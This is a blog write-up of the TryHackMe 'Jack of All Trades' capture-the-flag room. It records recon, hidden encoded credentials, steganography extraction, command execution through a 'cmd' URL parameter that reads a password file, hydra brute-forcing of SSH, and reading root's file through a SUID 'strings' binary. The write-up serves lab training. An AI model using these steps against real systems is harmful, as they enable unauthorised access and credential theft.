---
title : "Jack of All Trades - Write Up"
date : 2021-07-04T14:31:31+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "TryHackMe's easy level machine."
tags : ["strings","stego","RCE","steghide","TryHackMe"]
---

| Link | Level | Creator |
|------|-------|---------|
| [Here](https://tryhackme.com/room/jackofalltrades)  | Easy  |  [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)  |

## Reconn

As usual, using `nmap` we get the open ports of the machine. 

But, we get something quite unusual.

```bash
╰─ lanfran@parrot ❯ map 10.10.22.246                                                                                               ─╯
[sudo] password for lanfran: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 14:32 CEST
Nmap scan report for 10.10.22.246
Host is up (0.058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.85 seconds
```

We get the port switched!
The `SSH port it's the 80`.
And the `web port it's the 22`.

It's a good way to minf\*ck some clueless people!

Let's scan the web server with `gobuster`

```bash
╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/                                                                                                                              ─╯
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZX[REDACTED]Nzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```
We have some nice info here:
- We get an encoded text here.
- We found a new endpoint `recovery.php`.

1. We need to decode the text, so we are going to use [cyberchef](https://gchq.github.io/CyberChef/) !
	To decode it we need to use `Base64`

	And we get a message:
	`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTED]`

	Good! We have a password. Let's save it for later.


2. Using curl to navigate, we get also a encoded text hidden in the soruce code
```bash
╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/recovery.php                                                                                                                  ─╯
		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TE[REDACTED]TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

Let's use [cyberchef](https://gchq.github.io/CyberChef/) again to decode it!

The decode path is `Base32 -> Hex -> ROT13`.

And we get a message:
`Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S`

## Foothold - User

Navigating to that link, we get a Wikipedia's Stegosauria page. Maybe the creator it's telling us to use steganography?

Let's download all the pictures of the webpage!

After, running `steghide` with the password of the "1." point, we get a new file:

```bash
╰─ lanfran@parrot ❯ steghide extract -sf header.jpg                                                                                                                                       ─╯
Enter passphrase: u[REDACTED]
the file "cms.creds" does already exist. overwrite ? (y/n) y
wrote extracted data to "cms.creds".

╰─ lanfran@parrot ❯ cat cms.creds                                                                                                                                                         ─╯
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: [REDACTED]
```
Woohooo! We get the user's password for `recovery.php`!

So let's login now. [If you are getting the error "ERR_UNSAFE_PORT" on tyour browser, you have to enable the port 22. I google a way to fix it, in Brave/Chrome you have to pass the flag "--explicitly-allowed-ports=22"]

Great! We can even exploit the parameter `cmd` to do RCE.

After digging around, we find a file with passwords.

`http://10.10.194.240:22/nnxhweOV/index.php?cmd=cat%20%20/home/jacks_password_list`

Download that file, and let's use it, along with `hydra` to bruteforce the SSH (Remember that's on port 80 :) )

```bash
╰─ lanfran@parrot ❯ hydra -l jack -P pass.txt -s 80 ssh://10.10.22.246                                                                                                                    ─╯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-04 15:01:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.10.22.246:80/
[80][ssh] host: 10.10.22.246   login: jack   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-04 15:01:19
```
Great, we have now the password, so let's SSH in.

```bash
╰─ lanfran@parrot ❯ ssh jack@10.10.22.246 -p 80                                                                                                                                           ─╯
jack@10.10.22.246's password: 
jack@jack-of-all-trades:~$ ls -la
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
jack@jack-of-all-trades:~$ 
```

Let's `cat` the user's fla... F\*ck, it's an image. Let's download it to our local machine and read/copy the flag from it.
_I recommend using google translate's self image reader to copy the flag :)_

## Root

Scanning the machine, we found the binary `strings` that's owned by root and has the Sticky bit, so we can use it to read the root's flag.

```bash
jack@jack-of-all-trades:~$ ls -la /usr/bin/strings 
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{[REDACTED]}
```

And we "rooted" the machine!

That's all from my side, hope you find this helpful!